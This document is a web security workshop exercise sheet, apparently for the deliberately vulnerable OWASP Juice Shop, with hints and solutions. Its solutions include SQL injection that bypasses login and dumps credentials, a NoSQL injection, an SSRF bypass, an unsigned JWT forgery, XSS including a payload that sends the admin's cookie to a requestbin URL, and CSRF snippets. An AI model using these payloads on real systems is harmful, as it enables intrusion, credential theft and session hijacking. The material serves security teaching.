# Exercises

Make sure you understand the feature you are analysing for vulnerabilities.
Before attempting any exploits, walk the "happy path" and investigate if the feature works as expected.


## Zero Stars

Give a devestating zero-start feedback to the store. You find the feedback form at `/#/contact`.

<details>
  <summary>‚ùì Hint 1</summary>

Can you enable the button with the developer tools?

</details>

<details>
  <summary>‚ùì Hint 2</summary>

There is another way: Use ZAP to find the request and replay it with a 0 value.
    
</details>

<details>
  <summary>üìö Solution</summary>
<h3>Approach 1</h3>

- Visit `/#/contact`
- Don't change the rating, enter some comment and solve the CAPTCHA
- Right click on the submit button and inspect the element
- Remove the `disabled="true"` attribute
- Submit the form by clicking submit

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/zero-star-sol1.png?raw=true" alt="Screenshot that explains how to remove the disabled attribute of the button"/>

<h3>Approach 2</h3>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Visit the `/#/contact` site
3. Walk the happy path and submit a non-zero rating
4. Find the request that was triggered in the "History" when submitting the non-zero rating
5. Right click on the entry and click on "Open/Resend with Request Editor..."
6. Replace the submitted rating with 0 and send the request
7. Congrats, you're done :)

</details>


## Payback Time

Place an order that makes you rich.

<details>
  <summary>‚ùì Hint 1</summary>

When you order an item, you pay money. When you sell an item, you are being paid. Basic economics.

</details>

<details>
  <summary>‚ùì Hint 2</summary>

Have you tried ordering a negative amount of items?

</details>

<details>
  <summary>üìö Solution</summary>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Put any item into the basket
3. Have a look at your basket and increase the number of ordered items
4. Find the request that was triggered when increasing the number of ordered items
5. Resend the request with a negative number of items
<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/payback-time-sol1.png?raw=true" alt="Payback Time solution graphic: Request to reply"/>

6. Reload the basked an verify that you now have a negative total price
7. Proceed to checkout and cash in!

</details>


## Confidential Document

Access a confidential document.
Reading the about us (`/#/about`) might nudge you in the right direction.


<details>
  <summary>‚ùì Hint 1</summary>

Robots are certainly disallowed to access confidential files.
How would you tell google to hide a directory?

</details>

<details>
  <summary>üìö Solution</summary>

<h3>Approach 1</h3>

1. The "about us" page has a link to `/ftp/legal.md`
2. Have a look at the `/ftp` folder
3. Access the `acquisitions.md` file

Note: In this exercise, we nudged you towards the solution, but in practice an attacker would for instance use the ZAP Proxy's Spider functionality and then a domain fly-over tool (e.g. aquatone) to discover interesting resources.


<h3>Approach 2</h3>

1. In order to tell the robots of search engines not to inspect certain pages one can define a `robots.txt` file in the root directory
2. Have a look at the `/robots.txt` folder
3. `Disallow: /ftp` certainly sounds interesting
4. Have a look at the `/ftp` folder
5. Access the `acquisitions.md` file

</details>


## View Basket

You need some inspiration on what to buy. View another user's shopping basket.

<details>
  <summary>‚ùì Hint 1</summary>

Observe the HTTP traffic using ZAP when shopping. Is there a request with an interesting parameter that you could change in your favor?

</details>

<details>
  <summary>üìö Solution</summary>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Put any item into the basket
3. Have a look at your basket
4. Observe the GET request to `/rest/basket/{nr}`
5. Reply the request with another number

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/view-basket-sol1.png?raw=true" alt="View basket solution graphic: replied request"/>

</details>


## Forged Review

Privacy is important. Post a product review as another user or edit any user's existing review.

<details>
  <summary>‚ùì Hint 1</summary>

Observe the HTTP traffic using ZAP while submitting a review for the "Apple Juice". Can you alter any interesting parameters when sending a request to `/rest/products/1/reviews`?

</details>

<details>
<summary>üìö Solution</summary>

1. Open ZAP and the browser such that the traffic is routed through ZAP
2. Submit a review for the "Apple Juice"
3. Edit and resend the PUT request to `/rest/products/1/reviews`, with another author. For instance:
```
{"message":"This is a low-quality product. I can't recommend it.","author":"admin@juice-sh.op"}
```
</details>


## Login Admin

Sometimes it is boring to be a normal user. Login as the administrator (admin@juice-sh.op) instead.

<details>
  <summary>‚ùì Hint 1</summary>

User credentials are generally stored in a database, can you perform an injection that results in a positive query reply?

</details>

<details>
  <summary>‚ùì Hint 2</summary>

The email field is vulnerable.

</details>

<details>
  <summary>‚ùì Hint 3</summary>

Don't forget to comment out the trash after the injected commands.

</details>


<details>
<summary>üìö Solution</summary>

1. Try entering the email of the admin concatinated with a single quote `'`
2. There is an error, which can be an indicator for an SQLi vulnerability. And indeed, if we inspect the server response in ZAP, we even see a detailed error message, that indicates a SQLi
```json
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"5f4dcc3b5aa765d61d8327deb882cf99\"",
    "stack": "SequelizeDatabaseError: SQLITE_ERROR: unrecognized token: \"5f4dcc3b5aa765d61d8327deb882cf99\"\n    at Query.formatError (/home/loris/workspace/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:403:16)\n    at Query._handleQueryResponse (/home/loris/workspace/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:72:18)\n    at afterExecute (/home/loris/workspace/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:238:27)\n    at Statement.errBack (/home/loris/workspace/juice-shop/node_modules/sqlite3/lib/sqlite3.js:14:21)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = 'admin@juice-sh.op'' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = 'admin@juice-sh.op'' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
    },
    "sql": "SELECT * FROM Users WHERE email = 'admin@juice-sh.op'' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
  }
}
```
3. In order to login, we want the following query to return the elements of the user with the email `admin@juice-sh.op`:
```javascript
"SELECT * FROM Users WHERE email = '" + email + "' AND password = '" + f(password) + "' AND deletedAt IS NULL;"
```

There are multiple possibilities, but the easiest is `admin@juice-sh.op';--`, as this will result in

```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';--' AND password = '" + f(password) + "' AND deletedAt IS NULL;
```

which is equivalent to

```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op';
```

4. Login with `admin@juice-sh.op';--` as email and an arbitrary password.

</details>




## User Credentials

Data is power. Steal all user credentials by abusing the search functionality.

<details>
  <summary>‚ùì Hint 0 (the endpoint)</summary>

The vulnerable (legacy) search endpoint is located under the following path `/rest/products/search?q=<SEARCH QUERY>`.
You can find it by analyzing the traffic when reloading `/#/search?q=`.

</details>

<details>
  <summary>‚ùì Hint 1</summary>

The endpoint is vulnerable to SQL injections.
When exploiting a SQL injection, make sure that you know how to properly close the query.
Start by crafting a simple query that doesn't result in an error (e.g. does `test';--` work, or are there for instance any open brackets left?)

</details>

<details>
  <summary>‚ùì Hint 2</summary>

Exploit the SQLi by crafting an `UNION SELECT` query to join the data from another table to the results. Try to find out how many columns are necessary!

</details>

<details>
  <summary>‚ùì Hint 3</summary>

Use the `sqlite_schema` table to extract the relevant table names.

</details>

<details>
  <summary>‚ùì Hint 4</summary>

Use the `PRAGMA_TABLE_INFO('TABLE NAME GOES HERE')` table to extract the relevant column names.

</details>

<details>
<summary>üìö Solution</summary>

1. When analyzing `/#/search?q=juice` you will probably notice that it is a client-side implemented search, but we are looking for a server-side search to exploit an injection vulnerability.
By analyzing and playing around you can find the legacy server-side search by reloading the `/#/search?q=` endpoint: `/rest/products/search?q=<SEARCH QUERY>`
2. As in the <a href="#login-admin">Login Admin</a> exercise, we first try to provoke an error. Some text with a quote is always a good start: `juice'`
3. Indeed, we get an error. However, this time the error is less revealing as previously. In that case, one generally tries to fix the query by starting a comment: `juice'--`
4. This results in a "incomplete input" error, which indicates that some bracket might be open. After some trail and error, one discovers that two parenthesis are needed to complete the query: `juice'))--`
5. Now the fun begins, we want to craft an `UNION SELECT` query to read out the credentials. In a first step we assess the number of columns by trail and error. 9 seems to be the number:

```
/rest/products/search?q=juice%27))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9;--
```

6. In the next step, we have to find the table name for the user credentials. This can be done by guessing or by reading the `sqlite_schema` table.

```
/rest/products/search?q=juice%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9 from sqlite_schema;--
```

The table `Users` is the most likely to contain the user credentials.
7. Now, we need to know the column names, once again we can guess or use a sqlite feature to determine the relevant names.

```
/rest/products/search?q=juice%27))%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9 from PRAGMA_TABLE_INFO('Users');--
```

The columns `email` and `password` appear to be what we are looking for.
8. At this point, we have all we need to query the user credentials:

```
/rest/products/search?q=juice%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9 from Users;--
```

</details>


## NoSQL Manipulation

Look at the endpoint `PATCH /rest/products/reviews`.
Update multiple product reviews at the same time.

```javascript
module.exports = function productReviews () {
  return (req, res, next) => {
    const user = security.authenticatedUsers.from(req)
    db.reviews.update(
      { _id: req.body.id },
      { $set: { message: req.body.message } },
      { multi: true }
    ).then(
      result => {
        res.json(result)
      }, err => {
        res.status(500).json(err)
      })
  }
}
```

<details>
  <summary>‚ùì Hint 1</summary>

Read the documentation of
<a href="https://www.mongodb.com/docs/manual/reference/method/db.collection.update/">`db.collection.update` documentation</a>
and the <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">query operators documentation</a>.

Which query allows you to change multiple reviews at the same time?
</details>

<details>
  <summary>üìö Solution</summary>

1. We observe that we control the `_id` value via the `req.body.id` parameter.
As we gather from <a href="https://www.mongodb.com/docs/manual/reference/method/db.collection.update/">`db.collection.update`'s documentation</a>, we can edit multiple entries, since the `multi` option is set to true.
The <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">query operators documentation</a> explains different query selectors which can be used.
Hence instead of querying a specific id, we use a query selector such as `$ne`, or more precisely `{"$ne": -1}`.
2. Edit a product review while proxing the traffic through ZAP. This results in a `PATH /rest/products/reviews`.
Edit the request and send the following PATCH request
```
{"id":{"$ne":-1},"message":"would not buy again"}
```

</details>


## Null-Byte Injection

Download `/ftp/package.json.bak`.
Note node.js handles null-bytes differently than the underlying library which is written in C.

<details>
  <summary>‚ùì Hint 1</summary>

In C strings are terminated by a NULL byte.
Thus the string "hello.txt‚ñ†.md" (with ‚ñ† representing the NULL byte) will be seen as "hello.txt‚ñ†.md" in node.js, but as "hello.txt" in the low level library that opens the file.
How can this be exploited, when the access verification happens in node.js?

</details>

<details>
  <summary>‚ùì Hint 2</summary>

A url encoded null byte is represented as "%00", however, make sure you properly encode it when submitting the request.

</details>

<details>
  <summary>üìö Solution</summary>

We have to urlencode the % properly, then you are able to bypass the access control: `/ftp/package.json.bak%2500.md`

</details>

## Secret Password List

There is a very interesting file at `/ftp/password-list.png` but apparently only localhost can access it. Can you still get the file?

<details>
  <summary>‚ùì Hint 1</summary>

If the juice-shop would access the file, it would make a call to the localhost, i.e. `http://localhost:3000/ftp/password-list.png`

</details>

<details>
  <summary>‚ùì Hint 2</summary>

The profile picture looks like an ideal place to display scans. How are the pictures loaded when you enter a url?

</details>
  
<details>
  <summary>‚ùì Hint 3</summary>

How could you bypass this check?
```typescript
function invalid_url(url: string): boolean {  // ssrf check
  const bad_urls: string[] = ['http://127.0.0.1', 'https://127.0.0.1', 'http://localhost', 'https://localhost'];
  return bad_urls.some(prefix => url.startsWith(prefix));
}
```

</details>

<details>
  <summary>üìö Solution</summary>

As a logged-in user, visit your profile (Account->user@email.com).
On this page you are able to change your profile picture.
In particular you can specify an URL for the profile picture, we can verify that the server performs a request by inserting an URL we control (e.g. via RequestBin).
Once, we know that the server performs a request, we can try to use this request to access the scans that is said to be on the same server, but not accessible externally.
If we try `http://localhost:3000/ftp/password-list.png` as URL for our profile picture, we notice that this doesn't work.
However, URLs are complex, an easy bypass that often works is using basic auth: `http://a@localhost:3000/ftp/password-list.png`  
We see this is also successful here, and our profile picture is a password-list.

</details>


## Federated Authentication

Find a website with a social login and use ZAP to observe what happens when you sign in.  
Example: https://oag.azurewebsites.net


## JSON Web Token
Analyze a JWT from the shop with https://jwt-attacker.onrender.com

- What claims are in the token?
- How is it signed?

<details>
  <summary>üìö Solution</summary>

Inspect a request in ZAP, you find a `Authorization` header with a JWT.

The decoded JWT:
```json
{
  "typ": "JWT",
  "alg": "RS256"
}.
{
  "status": "success",
  "data": {
    "id": 21,
    "username": "",
    "email": "bla@bla.com",
    "password": "5f4dcc3b5aa765d61d8327deb882cf99",
    "role": "customer",
    "deluxeToken": "",
    "lastLoginIp": "127.0.0.1",
    "profileImage": "/assets/public/images/uploads/default.svg",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2022-04-25 06:00:37.724 +00:00",
    "updatedAt": "2022-04-25 06:11:39.984 +00:00",
    "deletedAt": null
  },
  "iat": 1650871490,
  "exp": 1650889490
}
.h-IJxnfpWv5sX6pq3Y_JigCMcf2dKBhokgzsI5ZbM9tUdvQdsT8iuCDVrjs2XSVBwEMfzdkCh_hmJIzfRgW8QnpZfuk3lXCJNlZzr93edC8cjxPwwQBsBQZhZ_GRvRHyoUT7bSMPUNP4T035HzGSUKLEsBsdP5THaMgt2ZwKjeQ
```

The claims can be seen in the above extract.

The signature algorithm is RS256, which stands for RSA Signature with SHA-256.

</details>


## Unsigned JWT

Forge an essentially unsigned JWT that impersonates the (non-existing) user jwtn3d@juice-sh.op.

<details>
  <summary>‚ùì Hint 1</summary>

Exploit a weird option, that is available when signing tokens with JWT.

</details>

<details>
  <summary>‚ùì Hint 2</summary>

The weird option is the none algorithm ;)

</details>


<details>
  <summary>üìö Solution</summary>

1. Decode the JWT as in the previous exercise
2. Replace the `alg` value to none and remove the signature
3. Update the email claim with jwtn3d@juice-sh.op
4. Encode the JWT
5. Send a request to the juice shop with the created JWT

This can be easily achieved with the JWT attacker: https://jwt-attacker.onrender.com

</details>


## DOM XSS

Perform a DOM XSS attack with the following payload: `<iframe src="javascript:alert('`xss`')">`.

<details>
  <summary>‚ùì Hint 1</summary>

Did you try searching?

</details>

<details>
  <summary>üìö Solution</summary>

Just search for `<iframe src="javascript:alert(`xss`)">`:

<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/xss-sol1.png?raw=true" alt="Screenshot that depicts the DOM XSS vulnerability proof of concept."/>


</details>


## Blind Persistent XSS

Perform a (blind) persistent XSS attack bypassing a client-side security mechanism.

- The admin can see a list of all users on `/#/administration`
- Admin login: admin@juice-sh.op / admin123

Can you extract the cookies and send it to you (https://requestbin.net/ might be helpful)?

<details>
  <summary>‚ùì Hint 1</summary>

What information is displayed to the admin? When can you set it?

</details>

<details>
  <summary>‚ùì Hint 2</summary>

When registering a new user the endpoint `/api/Users` is contacted. This looks interesting...

</details>

<details>
  <summary>‚ùì Hint 3 (Cookie exfiltration)</summary>

Have you tried the following?

```
<img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
```
</details>
<details>
  <summary>üìö Solution</summary>

1. When we login as admin and visit `/#/administration`, we see that the email
   of the registered users is displayed. The email can be set during
   registration. Let's try creating an account with some html tags as email
   address. If you try doing it via the UI it won't work as there is a
   client-side verification.
2. By inspecting the traffic, we learn that a POST request to `/api/Users` is
   performed. We observe that the email field is not verified server side and we
   can send any input (note, it is not clear at this point if inserted html tags
   aren't escaped in the admin interface).
3. Since we want to exfiltrate the cookie of the admin, we build a payload that
   fits this purpose. The following payload sends the cookie to YOUR.URL. 

```
<img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
```

For our PoC, we can use requestbin.net. Now, we send the following POST request
to `/api/Users`:

```json
{
    "email": "<img src=x onerror=\"this.src='https://requestbin.net/r/cbn65oyv?inspect?'+document.cookie; this.removeAttribute('onerror');\">",
    "password": "password",
    "passwordRepeat": "password",
    "securityQuestion": {
        "id": 2,
        "question": "Mother's maiden name?",
        "createdAt": "2022-04-25T21:18:01.837Z",
        "updatedAt": "2022-04-25T21:18:01.837Z"
    },
    "securityAnswer": "23"
}
```

4. At this point, we can login as admin and visit `/#/administration`.
5. The requestbin (or you server) will receive the request with the session
   cookie, i.e., you successfully exfiltrated the session cookie.


<img src="https://github.com/Zuehlke/WebSecurityWorkshop/blob/solutions/solutions/screenshots/blind-persistent-xss-sol1.png?raw=true" alt="Screenshot that shows exfiltrated cookie"/>

</details>


## Content Security Policy

Search for a websites with a CSP. How does the CSP of your favorite bank look like?


## CSRF

Change the name of a user by performing Cross-Site Request Forgery from another origin.

- Make your own attacker web-site that changes a logged-in user's Juice Shop username when she/he visits your site.
- Note: You need to use Firefox, because it does not treat cookies as `same-site=lax` per default.
- Can you do it with a CORS request and an autosubmitting `<form>`?
- Use a local file or `https://htmledit.squarefree.com` to simulate a different website.

<details>
  <summary>‚ùì Hint 1</summary>
`POST /profile`
</details>

<details>
  <summary>üìö Solution</summary>
  
The following two snippets execute the CSRF automatically.

<h3>Approach 1</h3>

```javascript
<form id="myForm" action="http://localhost:3000/profile" method="POST">
  <input name="username" value="form-csrf"/>
  <input type="submit"/>
</form>

<script>document.getElementById("myForm").submit();</script>
```

<h3>Approach 2</h3>

```javascript
fetch("http://localhost:3000/profile", {
    method: 'POST',
    credentials: 'include',
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "username=fetch-csrf"
  });
```

## Frontend Typosquatting

[Inform the shop](http://localhost:3000/#/contact) about a typosquatting imposter that dug itself deep into the frontend (Mention the exact name of the culprit in the contact form).

<details>
  <summary>‚ùì Hint 1</summary>
Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
</details>
<details>
  <summary>üìö Solution</summary>

1. Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
2. Go through the different dependencies and look them up on the internet
3. By looking up epilogue-js` and visiting https://www.npmjs.com/package/epilogue-js you'll see the hint, that this is a bogous package (to raise awareness)
4. By writing `epilogue-js` into the contact form and submitting it, you'll solve the challenge.

</details>

## Vulnerable Library

[Inform the shop](http://localhost:3000/#/contact) about a vulnerable library it is using (Mention the exact library name and version in your comment).

<details>
  <summary>‚ùì Hint 1</summary>
Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
</details>

<details>
  <summary>‚ùì Hint 2</summary>

Use Snyk or any other dependency scanner to analyze the Juice Shop's dependencies.

- Are there any outdated packages?
- How severe are the issues?
</details>

<details>
  <summary>üìö Solution</summary>


<h3>Snyk</h3>

1. Download and setup Snyk: https://docs.snyk.io/snyk-cli/install-the-snyk-cli  
   `npm install snyk -g`
2. Move the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a> into a new folder and rename it to package.json.
3. Run `npm install`
4. Run `snyk test`
5. Snyk lists all the vulnerable components!
6. By writing `express-jwt 0.1.3` into the contact form and submitting it, you'll solve the challenge.

</details>


## OWASP ZAP Scanning

Use OWASP ZAP to perform an automated dynamic test of your Juice Shop.

`docker run --net=host -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000`

- What kind of vulnerabilities does it find?
- Do you think it is useful?
- If you are interested, try the full scan.
